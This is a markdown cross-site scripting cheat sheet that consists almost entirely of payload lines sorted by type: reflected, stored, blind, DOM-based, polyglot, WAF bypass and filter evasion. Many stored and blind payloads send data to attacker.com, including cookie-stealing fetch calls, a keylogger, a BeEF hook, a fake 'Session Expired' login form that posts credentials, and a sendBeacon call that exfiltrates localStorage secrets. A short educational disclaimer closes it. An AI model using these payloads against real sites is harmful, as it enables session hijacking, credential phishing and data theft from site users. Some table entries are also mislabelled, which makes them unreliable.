```markdown
# Ultimate XSS Payload Cheat Sheet

## Table of Contents
1. [Reflected XSS Payloads](#reflected-xss-payloads)
2. [Persistent XSS Payloads](#persistent-xss-payloads)
3. [Blind XSS Payloads](#blind-xss-payloads)
4. [DOM-based XSS Payloads](#dom-based-xss-payloads)
5. [Classic XSS Payloads](#classic-xss-payloads)
6. [Filter Evasion Techniques](#filter-evasion-techniques)
7. [Advanced Persistent XSS](#advanced-persistent-xss)
8. [Framework-Specific Payloads](#framework-specific-payloads)
9. [Polyglot XSS Payloads](#polyglot-xss-payloads)
10. [WAF Bypass Payloads](#waf-bypass-payloads)
11. [HTML5-Specific Payloads](#html5-specific-payloads)
12. [Special Context Payloads](#special-context-payloads)
13. [Prevention Bypass Techniques](#prevention-bypass-techniques)

## Reflected XSS Payloads
Payloads that execute immediately when reflected in the response

### Basic Payloads
```html
<script>alert('XSS')</script>
<svg onload=alert('XSS')>
<img src=x onerror=alert('XSS')>
```

### Bypass Basic Filters
```html
<ScRiPt>alert('XSS')</ScRiPt>
<img """><script>alert('XSS')</script>">
<IMG SRC=javascript:alert('XSS')>
```

### Event Handlers
```html
<body onload=alert('XSS')>
<iframe onload=alert('XSS')>
<input type="text" onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
```

### JavaScript URI
```html
<a href="javascript:alert('XSS')">Click</a>
<iframe src=javascript:alert('XSS')>
```

### Unicode/Encoding Bypasses
```html
<script>\u0061lert('XSS')</script>
<img src=x onerror=\u0061lert('XSS')>
```

## Persistent (Stored) XSS Payloads
Payloads that persist in the database and execute when viewed

### Basic Persistent
```html
<script>alert(document.cookie)</script>
```

### Stealing Cookies
```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

### Keyloggers
```html
<script>document.onkeypress=function(e){fetch('https://attacker.com/log?key='+e.key)}</script>
```

### BeEF Hooks
```html
<script src="http://attacker.com/hook.js"></script>
```

### Fake Login Forms
```html
<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white">
  <form action="https://attacker.com/steal" method="POST">
    <h1>Session Expired</h1>
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
  </form>
</div>
```

## Blind XSS Payloads
Payloads for when you can't see the output directly

### Basic Blind
```html
<script>fetch('https://attacker.com/?blind='+document.location.href)</script>
```

### Advanced Blind
```html
<script>
  var data = '';
  data += 'URL: ' + document.location.href + '\n';
  data += 'Cookies: ' + document.cookie + '\n';
  data += 'User-Agent: ' + navigator.userAgent + '\n';
  fetch('https://attacker.com/collect', {method:'POST',body:data});
</script>
```

### Session Hijacking
```html
<script>
  setInterval(function(){
    fetch('https://attacker.com/log?cookie='+document.cookie)
  }, 5000);
</script>
```

## DOM-based XSS Payloads
Payloads that exploit client-side DOM manipulation

### Hash-based
```javascript
<script>eval(location.hash.slice(1))</script>
#alert('XSS')
```

### Document.write
```javascript
<script>document.write('<img src=x onerror=alert("XSS")>')</script>
```

### InnerHTML
```javascript
<script>document.body.innerHTML='<img src=x onerror=alert("XSS")>'</script>
```

### Eval-based
```javascript
<script>eval('alert("XSS")')</script>
```

### jQuery Sinks
```javascript
<script>$(location.hash)</script>
#<img src=x onerror=alert('XSS')>
```

### AngularJS Injection
```javascript
{{constructor.constructor('alert("XSS")')()}}
```

## Classic XSS Payloads
| Payload | Type | Description |
|---------|------|-------------|
| `<script>alert('XSS')</script>` | Reflected | Basic XSS test |
| `<img src=x onerror=alert('XSS')>` | Reflected | Image error handler |
| `<svg onload=alert('XSS')>` | Reflected | SVG vector payload |
| `<body onload=alert('XSS')>` | Reflected | Body tag event |

## Filter Evasion Techniques
| Payload | Type | Bypass Technique |
|---------|------|------------------|
| `<ScRiPt>alert('XSS')</ScRiPt>` | Reflected | Case manipulation |
| `<img src=x oneonerrorrror=alert('XSS')>` | Reflected | Obfuscated attribute |
| `<script>alert(1)</script>` | Reflected | Decimal HTML entities |
| `<iframe src="javas&Tab;cript:alert('XSS')">` | Reflected | Tab separation |

## Advanced Persistent XSS
| Payload | Type | Impact |
|---------|------|--------|
| `<script>new Image().src="http://attacker.com/?c="+document.cookie;</script>` | Persistent | Cookie theft |
| `<script>setInterval(function(){document.forms[0].action='http://attacker.com/steal';},5000)</script>` | Persistent | Form hijacking |
| `<iframe style="position:fixed;top:0;left:0;width:100%;height:100%" src="http://attacker.com/phish"></iframe>` | Persistent | Full-page overlay |
| `<script>navigator.sendBeacon('http://attacker.com/log', localStorage.getItem('secrets'))</script>` | Persistent | Data exfiltration |

## Framework-Specific Payloads
| Payload | Type | Target |
|---------|------|--------|
| `{{constructor.constructor('alert("XSS")')()}}` | AngularJS | Template injection |
| `<div ng-app ng-csp><div ng-click=$event.view.alert('XSS')>CLICK</div></div>` | AngularJS | ng-click event |
| `#{7*7}` | Ruby ERB | Template injection |
| `<%= 7 * 7 %>` | Ruby ERB | Server-side eval |

## Polyglot XSS Payloads
| Payload | Contexts |
|---------|----------|
| `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>` | HTML/JS/SVG |
| `';alert('XSS')//';alert('XSS')//";alert('XSS')//";alert('XSS')//--></SCRIPT>">'><SCRIPT>alert('XSS')</SCRIPT>` | Multiple contexts |
| `<img/src="x"/onerror=alert('XSS')>` | Minimal syntax |

## WAF Bypass Payloads
| Payload | Bypass Target |
|---------|--------------|
| `<script/xss src="data:,alert('XSS')"></script>` | Cloudflare |
| `<svg/onload=location='javascript:alert\u00281\u0029'>` | Akamai |
| `<div data-html=javascript:alert('XSS')></div>` | ModSecurity |
| `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click</a>` | Wordfence |

## HTML5-Specific Payloads
| Payload | Feature Used |
|---------|-------------|
| `<details ontoggle=alert('XSS')>` | Details element |
| `<video poster=javascript:alert('XSS')>` | Video attribute |
| `<input onfocus=alert('XSS') autofocus>` | Autofocus |
| `<math href="javascript:alert('XSS')">CLICK</math>` | MathML |

## Special Context Payloads
| Context | Payload |
|---------|---------|
| JavaScript string | `\';alert('XSS');//` |
| HTML attribute | `" onmouseover="alert('XSS')` |
| URL parameter | `javascript:alert('XSS')` |
| CSS value | `background:url('javascript:alert("XSS")')` |

## Prevention Bypass Techniques
| Technique | Example Payload |
|----------|----------------|
| Null byte | `<script>alert('XSS')%00</script>` |
| Line breaks | `<script>\nalert('XSS')\n</script>` |
| Multiple encoding | `%253Cscript%253Ealert('XSS')%253C/script%253E` |
| Unicode escape | `\u003Cscript\u003Ealert('XSS')\u003C/script\u003E` |

> **Legal and Ethical Notice:**  
> This document is for educational purposes only. Always obtain proper authorization before testing these payloads on any system. Unauthorized testing may violate laws like the Computer Fraud and Abuse Act (CFAA) and other cybersecurity regulations. Use this knowledge responsibly to improve web application security.
```

